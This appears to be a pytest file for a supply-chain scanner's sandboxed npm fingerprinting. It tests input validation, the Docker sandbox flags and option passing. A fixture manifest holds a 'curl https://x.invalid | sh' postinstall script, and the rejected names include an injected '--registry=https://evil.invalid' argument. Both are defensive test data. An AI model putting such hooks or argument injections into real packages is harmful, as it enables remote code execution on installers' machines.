"""The --sandbox option reaches the behavioral fetch, and its inputs are safe."""

from __future__ import annotations

import json
import subprocess

import pytest

from argus.core.config import Config
from argus.core.plugin import ScannerContext
from argus.core.project import Project
from argus.inventory.dependency_diff import PackageChange
from argus.scanners import dependency_diff
from argus.supply_chain import sandbox


@pytest.mark.parametrize("name", ["-x", "--registry=https://evil.invalid", "@scope/-x", "a b", ""])
def test_option_like_names_are_rejected(name):
    with pytest.raises(ValueError):
        sandbox._validate_npm(name, "1.0.0")


@pytest.mark.parametrize("version", ["--json", "-1", "1.0.0 2", ""])
def test_option_like_versions_are_rejected(version):
    with pytest.raises(ValueError):
        sandbox._validate_npm("left-pad", version)


@pytest.mark.parametrize("name", ["left-pad", "@types/node", "lodash.merge", "Uppercase"])
def test_normal_names_are_accepted(name):
    sandbox._validate_npm(name, "^1.2.3")


def test_docker_mode_runs_pinned_image_with_end_of_options(monkeypatch):
    captured: dict = {}

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        manifest = {
            "scripts": {"postinstall": "curl https://x.invalid | sh"},
            "dependencies": {"a": "1"},
        }
        return subprocess.CompletedProcess(cmd, 0, stdout=json.dumps(manifest), stderr="")

    monkeypatch.setattr(sandbox, "docker_available", lambda: True)
    monkeypatch.setattr(sandbox.subprocess, "run", fake_run)
    fp = sandbox.fetch_fingerprint("left-pad", "1.3.0", mode="docker")
    assert fp is not None and fp.suspicious_script and fp.install_scripts == ["postinstall"]
    cmd = captured["cmd"]
    image = next(part for part in cmd if part.startswith("node:"))
    assert "@sha256:" in image
    assert "'--'" in cmd[-1]  # npm view ... -- <spec>
    assert "--read-only" in cmd and "--cap-drop=ALL" in cmd


def test_docker_mode_without_docker_returns_none(monkeypatch):
    monkeypatch.setattr(sandbox, "docker_available", lambda: False)
    monkeypatch.setattr(
        sandbox, "npm_fingerprint", lambda *a, **k: pytest.fail("must not fall back to the host")
    )
    assert sandbox.fetch_fingerprint("left-pad", "1.3.0", mode="docker") is None


def test_host_mode_uses_registry_api(monkeypatch):
    calls = []
    monkeypatch.setattr(
        sandbox, "npm_fingerprint", lambda name, version, timeout: calls.append((name, version))
    )
    sandbox.fetch_fingerprint("left-pad", "1.3.0", mode="host")
    assert calls == [("left-pad", "1.3.0")]


def _ctx(tmp_path, options) -> ScannerContext:
    cfg = Config(scanner_options={"dependency-diff": options})
    return ScannerContext(project=Project.from_path(tmp_path), config=cfg)


def test_scanner_passes_sandbox_option_through(tmp_path, monkeypatch):
    change = PackageChange("npm", "left-pad", "package-lock.json", "1.0.0", "1.3.0")
    monkeypatch.setattr(dependency_diff, "diff_packages", lambda root, ref: [change])
    modes = []

    def fake_fetch(name, version, *, mode, timeout):
        modes.append(mode)

    monkeypatch.setattr(dependency_diff, "fetch_fingerprint", fake_fetch)
    list(
        dependency_diff.DependencyDiffScanner().scan(
            _ctx(tmp_path, {"ref": "main...HEAD", "sandbox": "docker"})
        )
    )
    assert modes == ["docker", "docker"]

    modes.clear()
    list(dependency_diff.DependencyDiffScanner().scan(_ctx(tmp_path, {"ref": "main...HEAD"})))
    assert modes == ["host", "host"]


def test_scanner_rejects_unknown_sandbox_mode(tmp_path):
    with pytest.raises(ValueError):
        list(
            dependency_diff.DependencyDiffScanner().scan(
                _ctx(tmp_path, {"ref": "main...HEAD", "sandbox": "vm"})
            )
        )
